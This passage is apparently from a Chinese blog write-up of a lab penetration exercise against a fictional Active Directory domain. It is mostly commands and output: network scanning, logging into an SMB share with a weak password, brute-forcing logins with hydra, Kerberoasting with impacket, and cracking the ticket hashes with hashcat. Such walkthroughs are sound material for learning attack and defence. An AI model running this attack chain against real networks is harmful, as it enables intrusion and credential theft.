class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp# ./fscan2 -h 172.22.9.19/24</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-04-17 00:40:03] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-04-17 00:40:03] [INFO] 开始信息扫描</span><br><span class="line">[2025-04-17 00:40:03] [INFO] CIDR范围: 172.22.9.0-172.22.9.255</span><br><span class="line">[2025-04-17 00:40:03] [INFO] 生成IP范围: 172.22.9.0.%!d(string=172.22.9.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="line">[2025-04-17 00:40:03] [INFO] 解析CIDR 172.22.9.19/24 -&gt; IP范围 172.22.9.0-172.22.9.255</span><br><span class="line">[2025-04-17 00:40:03] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-04-17 00:40:03] [INFO] 开始主机扫描</span><br><span class="line">[2025-04-17 00:40:03] [SUCCESS] 目标 172.22.9.19     存活 (ICMP)</span><br><span class="line">[2025-04-17 00:40:03] [SUCCESS] 目标 172.22.9.7      存活 (ICMP)</span><br><span class="line">[2025-04-17 00:40:03] [SUCCESS] 目标 172.22.9.26     存活 (ICMP)</span><br><span class="line">[2025-04-17 00:40:03] [SUCCESS] 目标 172.22.9.47     存活 (ICMP)</span><br><span class="line">[2025-04-17 00:40:06] [INFO] 存活主机数量: 4</span><br><span class="line">[2025-04-17 00:40:06] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:88</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:80</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:80</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:22</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.19:80</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:21</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.19:22</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:445</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.26:445</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:445</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:389</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:139</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:139</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.26:139</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:135</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.26:135</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 服务识别 172.22.9.47:22 =&gt; [ssh] 版本:7.6p1 Ubuntu 4ubuntu0.7 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7.]</span><br><span class="line">[2025-04-17 00:40:07] [SUCCESS] 服务识别 172.22.9.47:21 =&gt; [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).]</span><br><span class="line">[2025-04-17 00:40:07] [SUCCESS] 服务识别 172.22.9.19:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-04-17 00:40:11] [SUCCESS] 服务识别 172.22.9.7:88 =&gt;</span><br><span class="line">[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.19:80 =&gt; [http] 版本:1.18.0 产品:nginx 系统:Linux 信息:Ubuntu</span><br><span class="line">[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.26:445 =&gt;</span><br><span class="line">[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.7:80 =&gt; [http]</span><br><span class="line">[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.7:445 =&gt;</span><br><span class="line">[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.7:389 =&gt;</span><br><span class="line">[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.7:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.26:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.47:80 =&gt; [http]</span><br><span class="line">[2025-04-17 00:41:07] [SUCCESS] 服务识别 172.22.9.47:445 =&gt;</span><br><span class="line">[2025-04-17 00:41:07] [SUCCESS] 服务识别 172.22.9.47:139 =&gt;</span><br><span class="line">[2025-04-17 00:41:12] [SUCCESS] 服务识别 172.22.9.7:135 =&gt;</span><br><span class="line">[2025-04-17 00:41:12] [SUCCESS] 服务识别 172.22.9.26:135 =&gt;</span><br><span class="line">[2025-04-17 00:41:12] [INFO] 存活端口数量: 16</span><br><span class="line">[2025-04-17 00:41:12] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-04-17 00:41:12] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class="line">[2025-04-17 00:41:12] [SUCCESS] 网站标题 http://172.22.9.19        状态码:200 长度:612    标题:Welcome to nginx!</span><br><span class="line">[2025-04-17 00:41:12] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.9.26</span><br><span class="line">主机名: DESKTOP-CBKTVMO</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.9.26</span><br><span class="line">[2025-04-17 00:41:12] [SUCCESS] 网站标题 http://172.22.9.47        状态码:200 长度:10918  标题:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[2025-04-17 00:41:12] [SUCCESS] 网站标题 http://172.22.9.7         状态码:200 长度:703    标题:IIS Windows Server</span><br><span class="line">[2025-04-17 00:41:12] [SUCCESS] NetBios 172.22.9.7      DC:XIAORANG\XIAORANG-DC</span><br><span class="line">[2025-04-17 00:41:12] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.9.7</span><br><span class="line">主机名: XIAORANG-DC</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.9.7</span><br><span class="line">[2025-04-17 00:41:12] [SUCCESS] NetBios 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-04-17 00:41:12] [SUCCESS] SMB认证成功 172.22.9.47:445 administrator:123456</span><br><span class="line">[2025-04-17 00:41:12] [INFO] 系统信息 172.22.9.47 [Windows 6.1]</span><br><span class="line">[2025-04-17 00:41:12] [SUCCESS] NetBios 172.22.9.47     fileserver                          Windows 6.1</span><br><span class="line">[2025-04-17 00:41:12] [INFO] SMB2共享信息 172.22.9.47:445 administrator Pass:123456 共享:[print$ fileshare IPC$]</span><br><span class="line">[2025-04-17 00:41:12] [SUCCESS] 目标: http://172.22.9.7:80</span><br><span class="line">  漏洞类型: poc-yaml-active-directory-certsrv-detect</span><br><span class="line">  漏洞名称:</span><br><span class="line">  详细信息:</span><br><span class="line">        author:AgeloVito</span><br><span class="line">        links:https://www.cnblogs.com/EasonJim/p/6859345.html</span><br></pre></td></tr></table></figure>

<p>上来就扫到域控的漏洞了，但是现在还没有什么可用的信息没办法直接打。</p>
<p>172.22.9.47:445 smb服务存在一个弱口令登陆一下看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# smbclient //172.22.9.47/fileshare -U administrator%123465</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Wed Jul 13 04:12:10 2022</span><br><span class="line">  ..                                  D        0  Wed Jul 13 00:35:09 2022</span><br><span class="line">  personnel.db                        A    61440  Wed Jul 13 03:46:55 2022</span><br><span class="line">  secret                              D        0  Wed Apr 16 11:57:06 2025</span><br><span class="line">  Certified_Pre-Owned.7z              N  9572925  Wed Jul 13 04:12:03 2022</span><br><span class="line">  Certified_Pre-Owned.pdf             N 10406101  Wed Jul 13 04:08:14 2022</span><br><span class="line"></span><br><span class="line">                41152812 blocks of size 1024. 36033208 blocks available</span><br><span class="line">smb: \&gt; cd ..</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Wed Jul 13 04:12:10 2022</span><br><span class="line">  ..                                  D        0  Wed Jul 13 00:35:09 2022</span><br><span class="line">  personnel.db                        A    61440  Wed Jul 13 03:46:55 2022</span><br><span class="line">  secret                              D        0  Wed Apr 16 11:57:06 2025</span><br><span class="line">  Certified_Pre-Owned.7z              N  9572925  Wed Jul 13 04:12:03 2022</span><br><span class="line">  Certified_Pre-Owned.pdf             N 10406101  Wed Jul 13 04:08:14 2022</span><br><span class="line"></span><br><span class="line">                41152812 blocks of size 1024. 36033208 blocks available</span><br><span class="line">smb: \&gt; cd secret</span><br><span class="line">smb: \secret\&gt; ls</span><br><span class="line">  .                                   D        0  Wed Apr 16 11:57:06 2025</span><br><span class="line">  ..                                  D        0  Wed Jul 13 04:12:10 2022</span><br><span class="line">  flag02.txt                          N      659  Wed Apr 16 11:57:06 2025</span><br><span class="line"></span><br><span class="line">                41152812 blocks of size 1024. 36033208 blocks available</span><br></pre></td></tr></table></figure>

<p>找到flag02了</p>
<h1 id="FLAG3-amp-FLAG4"><a href="#FLAG3-amp-FLAG4" class="headerlink" title="FLAG3&amp;FLAG4"></a>FLAG3&amp;FLAG4</h1><p>flag02.txt里还给了一个提示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Yes, you have enumerated smb. But do you know what an SPN is?</span><br></pre></td></tr></table></figure>

<p>把所有文件都下载下来看一看,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt; select * from xr_users ;</span><br><span class="line">1|admin|admin</span><br><span class="line">2|******|i9XDE02pLVf</span><br><span class="line">3|******|6N70jt2K9sV</span><br><span class="line">4|******|fiAzGwEMgTY</span><br><span class="line">sqlite&gt; select * from xr_members ;</span><br><span class="line">1|huangmin|1|26|15220647319|huangmin@xiaorang.lab</span><br><span class="line">2|zhangrong|1|36|13073815024|zhangrong@xiaorang.lab</span><br><span class="line">3|liying|1|29|13126874319|liying@xiaorang.lab</span><br><span class="line">4|zhaoli|1|44|13075613024|zhaoli@xiaorang.lab</span><br><span class="line">5|zhangyan|0|35|15254139260|zhangyan@xiaorang.lab</span><br><span class="line">6|zhoujing|1|32|15123481906|zhoujing@xiaorang.lab</span><br><span class="line">7|liuying|1|24|13078310649|liuying@xiaorang.lab</span><br><span class="line">.......</span><br></pre></td></tr></table></figure>

<p> personnel.db里面有用户和3个不知道用户名的密码，先将数据处理一下吧，将xr_users和xr_members的内容分别保存到pass和user里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# cat pass|awk -F&#x27;|&#x27; &#x27;&#123;print($3)&#125;&#x27;&gt;pass.txt</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# cat pass.txt</span><br><span class="line">admin</span><br><span class="line">i9XDE02pLVf</span><br><span class="line">6N70jt2K9sV</span><br><span class="line">fiAzGwEMgTY</span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# cat user|awk -F&#x27;|&#x27; &#x27;&#123;print($2)&#125;&#x27; &gt;username.txt</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# cat username.txt</span><br><span class="line">huangmin</span><br><span class="line">zhangrong</span><br><span class="line">liying</span><br><span class="line">zhaoli</span><br><span class="line">zhangyan</span><br><span class="line">zhoujing</span><br><span class="line">liuying</span><br><span class="line">wanghao</span><br><span class="line">wangqiang</span><br><span class="line">wanglu</span><br><span class="line">zhaoyong</span><br><span class="line">zhangli</span><br><span class="line">wangning</span><br><span class="line">wangyu</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>用hydra爆破，可以爆破出来两个用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# hydra -L username.txt  -P pass.txt 172.22.9.26 smb</span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-16 13:02:49</span><br><span class="line">[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)</span><br><span class="line">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore</span><br><span class="line">[DATA] max 1 task per 1 server, overall 1 task, 1236 login tries (l:309/p:4), ~1236 tries per task</span><br><span class="line">[DATA] attacking smb://172.22.9.26:445/</span><br><span class="line">[445][smb] host: 172.22.9.26   login: zhangjian   password: i9XDE02pLVf</span><br><span class="line">[445][smb] host: 172.22.9.26   login: liupeng   password: fiAzGwEMgTY</span><br></pre></td></tr></table></figure>

<p>然后进行Kerberoast攻击</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">ServicePrincipalName                   Name      MemberOf  PasswordLastSet             LastLogon  Delegation</span><br><span class="line">-------------------------------------  --------  --------  --------------------------  ---------  ----------</span><br><span class="line">TERMSERV/desktop-cbktvmo.xiaorang.lab  zhangxia            2023-07-14 00:45:45.213944  &lt;never&gt;</span><br><span class="line">WWW/desktop-cbktvmo.xiaorang.lab/IIS   zhangxia            2023-07-14 00:45:45.213944  &lt;never&gt;</span><br><span class="line">TERMSERV/win2016.xiaorang.lab          chenchen            2023-07-14 00:45:39.767035  &lt;never&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">$krb5tgs$23$*zhangxia$XIAORANG.LAB$xiaorang.lab/zhangxia*$d0a75403c0fd68eb28e523ec82bbcc13$5d435dfada83bc3decd547576a2e0e533633be1ba2ca116bf3944fce42987d3a695c18247303f24a3f5b295919ed0bd0a682c106b81a1e733cf5b27d8816b85b5506c6cd1c04a7eefb3a12f46c00f1483854c51afb647d8fd064e86bc839305531c7a2cd3639f0b79fe070b1c3d10135ee7fc258f1abecec4bcad5d82c3b6a1031235a312c34e669df79ad94ed4a5ddd19f8919e26d5cbe49108176f7a1f52b21a438be962732cd3c7dfbd709b3ee3b7f0ffd4f8817aef4da2ebd5f2339538a6ee44a6e455a0d0ef760238d871f2a01d742aadf0a6dab09e4dac1b37fa317ef49f0bc9ed332df6a15eceabb304cae0d04df2e349ea41f193c8c41c9bbc8876db2cb6edf7ea19dffcbaa75b2e8cc062d873b7697397ae963d8454d867983429b9a24371a2b7b2ded8bb30454fc5c0c92346d0a00f706a04a3fab6a4dd59760f53107727237a316546634868fc926f582409cad4b4ab5674ef0994c60a1256b9677b9069818967813c3cd508a71e6e10fef1ddcbec756bb24cd1ed1d47ba09bed8d199398bf40cb19ecb0298342ca5eb67091f99a66c1cf2b62cb2fea208df89e75245d570e3e6617889d2c3f65be9c64747c21b2cdae4d1f9b06bdd921c46668c433952d0297d575e04e053e33f6251407793efc6e781406a2342a82d4a1939538883c6dff90f8c7845e140332b37efc66cb4d38f7ad7a4d3c66ef6c2d20b56e8de9a5db8db344e18a72a86f7b0447752356e35f6bc97cf328221921735aa58772dc5b800db10ccd461c95783887ad9a065b7b360365b03e5966f9886fd4b5db3472db78c2a7f514f767984e2944a89912e7d4d0bc8c56e7043b9f4bcebe6ea9d1fe4a6715630f1362b2ae5bf62f25c45d3a9fe2ac85e61728c57d1940f21ed763c403d21794e80bace45f553be48d3d367616d735dfc517573d75a418518e90f28c621b3fc614c1e89a7a7a07056a6a849587666ea91dd6b649d7f73356b8c4807f453b0d3209a52f3b99f81012a76dd0ff159d968dd15ad4c7c035792cd1d56f7c537418a3b466b0f6fa2038b159999f2620b20e14f452d3dee9052fac011c78eb3bff235ea41f85aa82e56c8fca3c626a18255f47c40e3e20ddf3c34083f99e9005b61efaa61f939786a024a86e5f56ee1920a452f7f74a66f8ddbfac75eebfd468bc99b2266d2638d7fbf9dae6ba76b36f97cb452eee2bc129553b5c7725b1dc5a6f91a0d67e9cfb3079024ac0c7379a8b1f6eb76223d021233bf75b8279d7d4b01211dbd4b3baaa1c566b945fd757cbe0e8eee3f7ca8df0e2133848109d16df8fddf6b2e62922c9eca4c980cc6949ed145a146b7d1e2ca5fed6c1b378f4963afb15e8c02120467c33f3b30dec45c39da63c7f847513ea72614af712ccb867c6fb31fc135f9690d543a34f6bba84114d71915c021e9a8ade8a50a96c311940bd680e314f4bc8c5a90376b5a313000d497372e4278713368219da610794a1fe1ff560f6c36f4b31e70b63a06c8</span><br><span class="line">$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$756eb4d4a5fe99658d9e4329a03d65a5$7ac1c23cb3d99bb83a38e222924cacfb56f615a4f9b9024b7c8e0879221f744b82ca58662adb97a7a3aa3f7cc6a0095f1b3e8f1cbb2e89433341f2399b12841eba64593a74ce3d6ea849ed9dbb5bda3918470942af00817782299bcb2c44c5b9723aaecf746cf760466f47fdfe5aecf6586e249f0bf305d437747b27e29d2a78d78a897fdb0cfe05a903d35e8e8c31f74091fa6b0886ca297c5ae56b656a67f0dee88e9bcfc8f720f172bfcb8df630ad566a2118f7b862f460fb9a28afee2f3e92069bc8bd3862d0812e3fca7991d851238ca3872cb190d091e3cca90adf4da38d364bc759831d0e61fd2a17864389989b4b1dd49d6ddabc60619d6788947bea7ac1a6040e201e362cbefbff3adb78434a80c66511ef8860493dc94dea833b94bf9b6477a986485e4ee3ab05c91d1ab6ffb8679247bcbfea6c2b51fc15a4ce37ce815e2a7a6185ee09f3bcb05e0c3d31b65d642c3a8cf7546125d03260500675da2efe3c15c234a2bc9f5139a3612d521ad0e8315b3bcde7c3f628c723222c20d19937c8a3497ca4763326686a54c619c2d730e03a6a3247615f4ebde209c7a1e87c1c351fdbf16afb6268755646e14dd2f0ee14a977c4bf1ad0231fc7e4a33ec018e790b5a8d103c9a2ba9f8f0877929c54eda6ffcd936658f2e876273ba5eeef5066ea031c1176bbf365a88e8627f4143173155e5a93920e5722d93054ab1d3596fab388acca607372a94f427a2b7555d6d7e2a0fde397de943b9c34b9d2f9f552dea129a2e1120137ff2a2894e4f19725ad4b282c5be4fe370f428ab9ee0b7bcb30d5ab0a334726edd459ce838630ef6905f6a91640ea3096ca2ebe18691f956c7d017c437aa6219ba880d9948daf8738f30af06b5c6038763dbe9e4b6abf29cdb5ebd742fdf7b334817a29f4a927ce294db573acfb69a7b9b3d4b34e758d0ee3901633c13b15365b3aa50db5cd66ac1a83ed3230dcd3396510eed1554ef6dddd485ae97d4b2385a60833a104672a55b3740a8b57c1f9dfe167fe1e16c6f2c4446c3297ef067441a5a536db4697f979e246cb3abb5aa46a41cc140ccf89b23b503e5975f2cd845e4822a0b1d7b240d6c63e225278745e97c2e32ce7ca1efb2d911c4076911b78fe26adaf5d2289b5e0e76cb0ff50e20e61a8ff76cd0ea14275cb64cb34c219c7a9b4cea7fa0255848fecefa0849a32ffa14f3491e7f83ad092506f123b16df02eb00090e12b2bb5b60291ef8a9d57d6d3fd8505ddf799fa0a56e6309b03f372002090da40e7419e75629c0b518ac4d011b709fcf7866c1a581b7e0a5ac0ae28af906d7b95334c1098eeb3ec94a4e3623b72f60a53182d6f02d60790642400e687954328e1224c473bf010f3c73fd3184269f4cf3d9cb91178a962cb085f3dd45abb794437fbb348904fb12440e7c6ed237d97422ddbde2b0ef6c912a4c4ff86b4153a266f103dd9d69b8806d44e57f0271fa6db4b6b02021a0bdd55ee38323fc9f8d7bbb0a8b</span><br></pre></td></tr></table></figure>

<p>可以拿到两个用户的hash，用hashcat爆破</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">hashcat  hash /usr/share/wordlists/rockyou.txt</span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# hashcat  hash --show</span><br><span class="line">Hash-mode was not specified with -m. Attempting to auto-detect hash mode.</span><br><span class="line">The following mode was auto-detected as the only one matching your input hash:</span><br><span class="line"></span><br><span class="line">13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol</span><br><span class="line"></span><br><span class="line">NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!</span><br><span class="line">Do NOT report auto-detect issues unless you are certain of the hash type.</span><br><span class="line"></span><br><span class="line">$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$2fef93477c96377b81b856c0a918b0f8$7b12ec73692a807cdb959eaeabd253a016b9a6617e9e882016aeba5e5c1f28e4e1d9bb1ce3cfedba110b3c628726b1b50585672544354fae17ec956eff2e27c39494cf3a08d7ab530114273c7d2332866c1483791d6a32b0fea66422abd61412b64b6bd672e30cf844a1da47c8c1cf6791e00abadb34423301ead5ba16fd13631a7a2e29bafaaa9d55a6f9063ef06838953339018d2a077e7c4db47fec5c341c2c53562bf772bd047f5035aade21b9c0c2ad8dc1eec04aa2a1f9e120c6f1508b734895b0ac1cf384ee3b01ffc723b963826221c291f0fbedf92c8f42d549c611b547d1a5bd2cb93c149b8fb01ecc0d785ca8615d49f2d77015c4431d3a122d723936f57e7abb137ce18d22ced5690de6fc3daa6c45f81f97a4427a8c9adb6665eb3ed0010961f38a8860aaaba72a49b67ec435f7ada78ccab514b6c4e465bf0a9b3c14f3e62f580b79d811d2814e3c952dd9a7cacf451632035e1f819a0289913b6f536d317a920b025da509fec7ad356b4d62d892080a87274e2cda87823971f719275afa7b00615cb43e00c586dc09d2f48d909944d352ef0f1b96b74e924c33b4d7a71618c6aaeea94c7b1b61fdc3cbda2b3a0074942a982e7c63258b58ffc74ca532760ad3da4d1b3f5275330457877de4d840477b03c1dbef4ab68bfbfc0400bb63082c9fdc3ca13cc89a8b91846e06d69a8d713aa7e184cc7ed888df935d42580969a9bb00fd61887bd7c55eca669e14ef8705fcb9d5515218c991935c5b37973b363ba58453543a7033e1869d6e1f4304c1887274b04bbe3bea1a24556698ba5fb21218100cfbd73fc5d09e424786f6e64b39e36c7d86b751c502d9f101a368e575c0be0fe4660db85b5d8c13af3c06c870bf3db18e9e7056256d29b153fc6724f6778c8502b763178a34d1fcd67c172d9a943f0a55b972b0d68f0d9507cfbd8acac33d5b340c6db1728a6ff79537e91c9fde40764b79448cf5f122080d770a860baf50a76a08076ac52de4d671cc8bd84f79bda7c0a52988b62a2954f7fe274ab0ad008cdbf8c3710d7d9cd263d9479c3309de5fec18ce56758e056dcfd942500adea9a14da3555e29e9277f8ca07af73299f70472137f7cd045b60f639f14b3bcfcf635c4ec0c0359c4d7238121af36fa7fb29316d4a45890c0973e432fb2b617256cfeec85c8496c506e79c31e4507eaf5ecc7d67540eed5fec810cdcf6d1682156597450c27b27ad617fdf0fd03abe04d181e58cec2af1edc85e243102c8db404aaaca939c42a54d633585eb7e26348ff26951c5cc8c6271d227520fdea38033174b4efddf6a589688223b263e8808fdbc85bbe20ea471fb529216d802776dcc3a7ef68334059213d49640da993c067719c0b119f9c3914295dedefcbd89f0facf3ba3700227de362e49f88302bf87e4cfc5787b364951e3301efa5ff817f5dbf372536ec3aa4:@Passw0rd@</span><br></pre></td></tr></table></figure>

<p>然后用<code>chenchen@xiaorang.lab:@Passw0rd@</code>进行远程桌面登录,用bloodhound进行信息搜集（其实也不用，因为之前fscan已经扫到洞了）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# bloodhound-python -u chenchen -p @Passw0rd@ -d xiaorang.lab  -c all --dns-tcp -ns 172.22.9.7 --auth-method ntlm --zip</span><br><span class="line">INFO: Found AD domain: xiaorang.lab</span><br><span class="line">INFO: Connecting to LDAP server: xiaorang-dc.xiaorang.lab</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains in the forest</span><br><span class="line">INFO: Found 2 computers</span><br><span class="line">INFO: Connecting to LDAP server: xiaorang-dc.xiaorang.lab</span><br><span class="line">INFO: Found 95 users</span><br><span class="line">INFO: 